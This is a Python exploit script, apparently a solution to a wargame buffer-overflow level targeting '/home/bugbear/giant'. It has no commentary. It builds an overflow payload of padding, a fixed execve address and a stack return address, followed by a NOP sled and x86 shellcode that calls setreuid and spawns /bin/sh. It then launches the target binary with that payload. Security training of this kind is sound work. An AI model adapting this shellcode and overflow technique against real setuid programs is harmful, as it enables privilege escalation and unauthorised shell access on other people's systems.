import struct
import os

target = "/home/bugbear/giant"
payload = ""
execveAddr = 0x400a9d48
shell = "\x90"*100 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"
ret = 0xbffffbe3

def append(x):
    return payload + x

def p(x):
    return struct.pack("<L", x)

payload = append("\x90" * 44)
payload = append(p(execveAddr))
payload = append(p(ret)) #ret
payload = append(shell)
pid = os.fork()

if pid == 0:
    os.execv(target, (target, payload))
else:
    os.waitpid(pid, 0)